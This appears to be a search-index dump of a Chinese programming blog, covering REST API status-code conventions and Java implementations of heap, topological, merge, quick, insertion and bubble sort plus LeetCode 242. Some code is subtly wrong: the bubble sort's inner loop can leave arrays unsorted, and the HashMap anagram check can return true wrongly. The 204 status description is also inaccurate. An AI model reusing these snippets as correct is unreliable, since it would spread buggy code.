更好的做法是，除了第一级，其他级别都用查询字符串表达。\n# GET /authors/12?categories=2 下面是另一个例子，查询已发布的文章。你可能会设计成下面的 URL。\n# GET /articles/published 查询字符串的写法明显更好\n# GET /articles?published=true 不要返回纯本文\nAPI 返回的数据格式，不应该是纯文本，而应该是一个 JSON 对象，因为这样才能返回标准的结构化数据。所以，服务器回应的 HTTP 头的Content-Type属性要设为application/json。\n客户端请求时，也要明确告诉服务器，可以接受 JSON 格式，即请求的 HTTP 头的ACCEPT属性也要设成application/json。下面是一个例子。\nGET /orders/2 HTTP/1.1 Accept: application/json 发生错误时，不要返回 200 状态码\n有一种不恰当的做法是，即使发生错误，也返回200状态码，把错误信息放在数据体里面，就像下面这样。\nHTTP/1.1 200 OK Content-Type: application/json { \u0026#34;status\u0026#34;: \u0026#34;failure\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;error\u0026#34;: \u0026#34;Expected at least two items in list.\u0026#34; } } 上面代码中，解析数据体以后，才能得知操作失败。\n这种做法实际上取消了状态码，这是完全不可取的。正确的做法是，状态码反映发生的错误，具体的错误信息放在数据体里面返回。\nHTTP/1.1 400 Bad Request Content-Type: application/json { \u0026#34;error\u0026#34;: \u0026#34;Invalid payoad.\u0026#34;, \u0026#34;detail\u0026#34;: { \u0026#34;surname\u0026#34;: \u0026#34;This field is required.\u0026#34; } } 常见的状态码\n2XX 状态码：请求成功\n200 OK：状态码表示操作成功。 201 Created：成功请求并创建了新的资源，用于POST请求返回。 202 Accepted：表示服务器已经收到请求，但还未进行处理，会在未来再处理，用于异步操作。 204 No Content：表示资源已经不存在，用于DELETE请求返回。 3XX 状态码：重定向\n301 Moved Permanently：状态码（永久重定向）。 302 Found：状态码（暂时重定向）。 303 See Other：表示参考另一个 URL。 4XX 状态码:表示客户端错误\n400 Bad Request：服务器不理解客户端的请求，未做任何处理。 401 Unauthorized：用户未提供身份验证凭据，或者没有通过身份验证。 403 Forbidden：用户通过了身份验证，但是不具有访问资源所需的权限。 404 Not Found：所请求的资源不存在，或不可用。 405 Method Not Allowed：用户已经通过身份验证，但是所用的 HTTP 方法不在他的权限之内。 410 Gone：所请求的资源已从这个地址转移，不再可用。 415 Unsupported Media Type：客户端要求的返回格式不支持。比如，API 只能返回 JSON 格式，但是客户端要求返回 XML 格式。 422 Unprocessable Entity ：客户端上传的附件无法处理，导致请求失败。 429 Too Many Requests：客户端的请求次数超过限额。 5XX 状态码:表示服务端错误。\n一般来说，API 不会向用户透露服务器的详细信息，所以只要两个状态码就够了。 500 Internal Server Error：客户端请求有效，服务器处理时发生了意外。 503 Service Unavailable：服务器无法处理请求，一般用于网站维护状态。 END!\n"},{"id":70,"href":"/posts/2022/%E5%A0%86%E6%8E%92%E5%BA%8F/","title":"堆排序","section":"博客","content":"堆定义 每个堆都是完全二叉树（从上到下，从左到右，高最大相差一）。 大顶堆：每个结点的值都大于或等于其左右孩子结点的值。 小顶堆：每个结点的值都小于或等于其左右孩子结点的值。\n同时，我们对堆中的结点按层进行编号，将这种逻辑结构映射到数组中就是下面这个样子。 整体解题思路： 1、先把要排序的数据放到数组中。 2、对数组中的数组进行构建成堆。 3、将构建好的堆中的头数据与结尾数据交换并截取出结尾数据。 4、继续将剩下的数据构建成堆，并重复3操作，直到结束。\n构建成堆时的几个关键点： 1、尾部元素的父结点计算： (arr.length-1)/2 2、父元素的左结点计算：i * 2 + 1 3、父元素的右结点计算：i * 2 + 2 4、从右到左，从下到上进行比较与交换，最后形成堆\nJava代码\npublic class HeapSort { public static void main(String[] args) { int[] arr = {16, 2,123,7, 3, 20, 17, 8,123,1,221}; HeapSort heapSort = new HeapSort(); heapSort.heapSort(arr); System.out.println(Arrays.toString(arr)); } public void heapSort(int[] arr) { // 找出大头堆，与结尾交换，并截取出尾部 for (int i = arr.length-1; i \u0026gt; 0; i--) { // 将交换后的数组，再次构建成堆 buildHeap(arr,i); swap(arr,0, i); } } /** * 构建堆 * 10 * / \\ * 5 8 * / \\ / \\ * 3 4 6 7 * 正好可以用一个数组表示 {10,5,8,3,4,6,7} * 元素父节点： (i-1)/2 * 元素左子节点： 2i+1 * 元素右子节点： 2i+2 * @param arr 数组 * @param length 堆长度 */ private void buildHeap(int[] arr, int length) { // 父节点 int parent = (length - 1) / 2; for (int i = parent; i \u0026gt;= 0 ; i--) { adjustHeap(arr, i, length); } } /** * 调整堆，，找出最大值节点，与parent节点交换 * @param arr 数组 * @param parent 父节点 * @param length 堆长度 */ private void adjustHeap(int[] arr, int parent, int length) { int leftChild = 2 * parent + 1; int max = parent; // 左节点 if (leftChild \u0026lt;= length \u0026amp;\u0026amp; arr[leftChild] \u0026gt; arr[max]) { max = leftChild; } // 右节点 if (leftChild + 1 \u0026lt;= length \u0026amp;\u0026amp; arr[leftChild + 1] \u0026gt; arr[max]) { max = leftChild + 1; } if (max != parent) { swap(arr, max, parent); } } private void swap(int[] arr, int i, int j) { int tmp = arr[i]; arr[i] = arr[j]; arr[j] = tmp; } } "},{"id":71,"href":"/posts/2022/%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F/","title":"拓扑排序","section":"博客","content":"基本思想 拓扑排序应用的场合不再是一个简单的数组，而是研究图论里面顶点和顶点连线之间的性质。拓扑排序就是要将这些顶点按照相连的性质进行排序。拓扑排序一般用来理清具有依赖关系的任务。\n实现\n将问题用一个有向无环图（DAG, Directed Acyclic Graph）进行抽象表达，定义出哪些是图的顶点，顶点之间如何互相关联。 可以利用广度优先搜索或深度优先搜索来进行拓扑排序。 Leetcode题目\nLeetcode 207. 课程表 Leetcode 210. 课程表 II 课程表 II 解题\n题目\n现在你总共有 n 门课需要选，记为 0 到 n-1。 在选修某些课程之前需要一些先修课程。 例如，想要学习课程 0 ，你需要先完成课程 1 ，我们用一个匹配来表示他们: [0,1] 给定课程总量以及它们的先决条件，返回你为了学完所有课程所安排的学习顺序。 可能会有多个正确的顺序，你只要返回一种就可以了。如果不可能完成所有课程，返回一个空数组。 示例: 输入: 4, [[1,0],[2,0],[3,1],[3,2]] 输出: [0,1,2,3] or [0,2,1,3] 解释: 总共有 4 门课程。要学习课程 3，你应该先完成课程 1 和课程 2。并且课程 1 和课程 2 都应该排在课程 0 之后。 因此，一个正确的课程顺序是 [0,1,2,3] 。另一个正确的排序是 [0,2,1,3] 。 步骤\n1、设定顶点（节点）变量个数，和个数之间的路线关系（用二维数组保存） 2、使用一个一维数组用来记录顶点（节点）入度的数量 3、设置一个队列，把入度为0的数放入队列 4、设置一个一维数组用于保存返回值，取出队列元素放到一维数组，并修改其他节点的入度数量。 5、返回\nJava代码\npublic int[] topologicalSort(int numCourses, int[][] prerequisites) { // 用于保存节点入度 int[] in = new int[numCourses]; // 响应结果 int[] res = new int[numCourses]; // 队列，用于保存入度为0的结点 Queue\u0026lt;Integer\u0026gt; queue = new LinkedList\u0026lt;\u0026gt;(); // 统计节点的入度 for (int[] edge: prerequisites) { in[edge[0]]++; } // 把入度为0的结点放入队列 for (int i = 0; i \u0026lt; numCourses; i++) { if (in[i] == 0) { queue.offer(i); } } // 返回值索引 int index = 0; // 当有入度为0时，执行 while (!queue.isEmpty()) { Integer tmp = queue.poll(); res[index++] = tmp; for (int[] edge : prerequisites) { if (edge[1] == tmp) { // 减少入度个数 in[edge[0]]--; // 入度为0，放入队列中 if (in[edge[0]] == 0) { queue.offer(edge[0]); } } } } // 如果出现环了，入度没有0的结点 if (index != numCourses) { return new int[]{}; } return res; } END!\n"},{"id":72,"href":"/posts/2022/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/","title":"归并排序","section":"博客","content":"基本思想 核心是分治，就是把一个复杂的问题分成两个或多个相同或相似的子问题，然后把子问题分成更小的子问题，直到子问题可以简单的直接求解。\n实现 把数组从中间划分成两个子数组，一直递归地把子数组划分成更小的子数组，直到子数组里面只有一个元素，才开始合并排序。\n分解左右并排序 左右两部分合并排序 Java代码\npublic void mergeSort(int[] nums, int left, int right) { if (left \u0026gt;= right) { return; } int middle = (left + right)/2; // 分化数组 mergeSort(nums, left, middle); // 分化数组 mergeSort(nums, middle+1, right); // 合并左右边 merge(nums,left,middle,right); } // 合并排序好的左边和右边 public void merge(int[] nums, int left, int middle, int right) { //临时数组 int[] tmp = new int[right-left+1]; // start1 左边索引 start2右边索引 index 临时数组索引 int start1 = left, start2 = middle + 1, index = 0; while (start1 \u0026lt;= middle || start2 \u0026lt;= right) { if (start1 \u0026gt; middle) { // 左边已经排序完，只排序右边 tmp[index++] = nums[start2++]; } else if (start2 \u0026gt; right) { //右边已经排序完，只排序左边 tmp[index++] = nums[start1++]; } else if (nums[start1] \u0026gt; nums[start2]) { //两边都没有排序完 tmp[index++] = nums[start2++]; } else { //两边都没有排序完 tmp[index++] = nums[start1++]; } } // 把排序好的数据重新赋值回原数组中 for (int i = left; i \u0026lt;= right; i++) { nums[i] = tmp[i-left]; } } 空间复杂度\n由于合并 n 个元素需要分配一个大小为 n 的额外数组，合并完成之后，这个数组的空间就会被释放，所以算法的空间复杂度就是 O(n)。归并排序也是稳定的排序算法。\n时间复杂度\n归并算法是一个不断递归的过程。\n举例：数组的元素个数是 n，时间复杂度是 T(n) 的函数。\n解法：把这个规模为 n 的问题分成两个规模分别为 n/2 的子问题，每个子问题的时间复杂度就是 T(n/2)，那么两个子问题的复杂度就是 2×T(n/2)。当两个子问题都得到了解决，即两个子数组都排好了序，需要将它们合并，一共有 n 个元素，每次都要进行最多 n-1 次的比较，所以合并的复杂度是 O(n)。由此我们得到了递归复杂度公式：T(n) = 2×T(n/2) + O(n)。\n对于公式求解，不断地把一个规模为 n 的问题分解成规模为 n/2 的问题，一直分解到规模大小为 1。如果 n 等于 2，只需要分一次；如果 n 等于 4，需要分 2 次。这里的次数是按照规模大小的变化分类的。\n以此类推，对于规模为 n 的问题，一共要进行 log(n) 层的大小切分。在每一层里，我们都要进行合并，所涉及到的元素其实就是数组里的所有元素，因此，每一层的合并复杂度都是 O(n)，所以整体的复杂度就是 O(nlogn)。\nEND!\n"},{"id":73,"href":"/posts/2022/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/","title":"快速排序","section":"博客","content":"基本思想 快速排序也采用了分治的思想。\n实现 随机把一个数作为基准（一般使用第一个数），把原始的数组筛选成较小和较大的两个子数组，然后递归地排序两个子数组。\n步骤分解 Java代码\npublic void quickSort(int[] nums, int left, int right) { if (left \u0026gt;= right) { return; } // 找出基准分割界点 int middle = helper(nums, left, right); // 左边继续排序 quickSort(nums,left, middle-1); // 右边继续排序 quickSort(nums, middle+1,right); } private int helper(int[] nums, int left, int right) { // 以val为基准，把比val大的数放一边，比val小的数放一边 int val = nums[left]; while (left \u0026lt; right) { while (val \u0026lt;= nums[right] \u0026amp;\u0026amp; left \u0026lt; right) { right--; } nums[left] = nums[right]; while (val \u0026gt;= nums[left] \u0026amp;\u0026amp; left \u0026lt; right) { left++; } nums[right] = nums[left]; } nums[left] = val; return left; } 时间复杂度\n最优情况：被选出来的基准值都是当前子数组的中间数。 这样的分割，能保证对于一个规模大小为 n 的问题，能被均匀分解成两个规模大小为 n/2 的子问题（归并排序也采用了相同的划分方法），时间复杂度就是：T(n) = 2×T(n/2) + O(n)。 把规模大小为 n 的问题分解成 n/2 的两个子问题时，和基准值进行了 n-1 次比较，复杂度就是 O(n)。很显然，在最优情况下，快速排序的复杂度也是 O(nlogn)。\n最坏情况：基准值选择了子数组里的最大或者最小值 每次都把子数组分成了两个更小的子数组，其中一个的长度为 1，另外一个的长度只比原子数组少 1。算法复杂度为 O(n2)。\nEND!\n"},{"id":74,"href":"/posts/2022/%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F/","title":"插入排序","section":"博客","content":"在冒泡排序中，经过每一轮的排序处理后，数组后端的数是排好序的；而对于插入排序来说，经过每一轮的排序处理后，数组前端的数都是排好序的。\n基本思路：当迭代到i时，会向前比较，插入到合适的位置（去在线算法演示体会）。\nJava代码\npublic void insertionSort(int[] nums) { for (int i = 1; i \u0026lt; nums.length; i++) { for (int j = i; j \u0026gt;= 1; j--) { if (nums[j-1] \u0026lt; nums[j]) { break; } int tmp = nums[j-1]; nums[j-1] = nums[j]; nums[j] = tmp; } } } 空间复杂度\n假设数组的元素个数是 n，由于在整个排序的过程中，是直接在给定的数组里面进行元素的两两交换，空间复杂度是 O(1)。\n时间复杂度\n给定的数组按照顺序已经排好 只需要进行 n-1 次的比较，两两交换次数为 0，时间复杂度是 O(n)。这是最好的情况。\n给定的数组按照逆序排列 在这种情况下，我们需要进行 n(n-1)/2 次比较，时间复杂度是 O(n2)。这是最坏的情况。\n给定的数组杂乱无章 在这种情况下，平均时间复杂度是 O(n2)。\n由此可见，和冒泡排序一样，插入排序的时间复杂度是 O(n2)，并且它也是一种稳定的排序算法。\n练习题目：LeetCode 第 147 题\nEND!\n"},{"id":75,"href":"/posts/2022/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/","title":"冒泡排序","section":"博客","content":"冒泡排序是非常简单的一种排序，我们只需求知道他是怎样交换的就可以了。\n基本规则：从左到右依次比较，把最大的数放到右边，依次迭代（先是保证末端排好，再向前迭代）。可以找个“在线算法演示”进行体会。\nJava代码\npublic void bubbleSort(int[] nums) { for (int i = 0; i \u0026lt; nums.length-1; i++) { for (int j = i; j \u0026lt; nums.length-1; j++) { if(nums[j] \u0026gt; nums[j+1]) { int tmp = nums[j]; nums[j] = nums[j+1]; nums[j+1] = tmp; } } } } 那还有没有得优化的呢？结果是当然的。当冒泡还没有完成时，已经排好序了。这时，如果还继续冒泡会浪费时间。在这里，我们可以设置一个flag进行状态的记录。\npublic void bubbleSort2(int[] nums) { for (int i = 0; i \u0026lt; nums.length-1; i++) { boolean flag = true; for (int j = i; j \u0026lt; nums.length-1; j++) { if(nums[j] \u0026gt; nums[j+1]) { int tmp = nums[j]; nums[j] = nums[j+1]; nums[j+1] = tmp; flag = false; } } if (flag) return; } } 空间复杂度\n假设数组的元素个数是 n，由于在整个排序的过程中，我们是直接在给定的数组里面进行元素的两两交换，所以空间复杂度是 O(1)。\n时间复杂度\n给定的数组按照顺序已经排好 在这种情况下，我们只需要进行 n−1 次的比较，两两交换次数为 0，时间复杂度是 O(n)。这是最好的情况。\n给定的数组按照逆序排列 在这种情况下，我们需要进行 n(n-1)/2 次比较，时间复杂度是 O(n2)。这是最坏的情况。\n给定的数组杂乱无章 在这种情况下，平均时间复杂度是 O(n2)。\n由此可见，冒泡排序的时间复杂度是 O(n2)。它是一种稳定的排序算法。\nEND!\n"},{"id":76,"href":"/posts/2022/Leetcode242.%E6%9C%89%E6%95%88%E7%9A%84%E5%AD%97%E6%AF%8D%E5%BC%82%E4%BD%8D%E8%AF%8D/","title":"Leetcode242.有效的字母异位词","section":"博客","content":"题目\n给定两个字符串 s 和 t ，编写一个函数来判断 t 是否是 s 的字母异位词。 示例 1: 输入: s = \u0026#34;anagram\u0026#34;, t = \u0026#34;nagaram\u0026#34; 输出: true 示例 2: 输入: s = \u0026#34;rat\u0026#34;, t = \u0026#34;car\u0026#34; 输出: false 说明: 你可以假设字符串只包含小写字母。 进阶: 如果输入字符串包含 unicode 字符怎么办？你能否调整你的解法来应对这种情况？ 针对这种情况，我们可以使用字母的特性，只有26个字母。 1、我们可以建立一个26位大小的数组作为计数器。 2、遍历S，把其中的字母放入到计数器中。 3、遍历T，把对应的字母从计数器中减少，并判断是否合理。\n代码\npublic boolean isAnagram(String s, String t) { if(s.length() != t.length()) { return false; } int[] counter = new int[26]; for (int i = 0; i \u0026lt; s.length(); i++) { counter[s.charAt(i) - \u0026#39;a\u0026#39;]++; } for (int i = 0; i \u0026lt; t.length(); i++) { if (--counter[t.charAt(i) - \u0026#39;a\u0026#39;] \u0026lt; 0) { return false; } } return true; } 针对如果我们在不确定字符的范围时，我们可以使用Hash来替换数组，去除大小个数的限定。\n这是使用HashMap进行改造：\npublic boolean isAnagram(String s, String t) { if(s.length() != t.length()) { return false; } Map\u0026lt;Character,Integer\u0026gt; counter = new HashMap\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; s.length(); i++) { Integer mun = counter.getOrDefault(s.charAt(i), 0); counter.put(s.charAt(i), mun + 1); } for (int i = 0; i \u0026lt; t.length(); i++) { Integer mun = counter.getOrDefault(t.charAt(i), 0); counter.put(t.charAt(i), mun - 1); if ( mun \u0026lt; 0) { return false; } } return true; } "},{"id":77,"href":"/docs/","title":"Docs","section":"Introduction","content":""},{"id":78,"href":"/posts/","title":"博客","section":"Introduction","content":""}]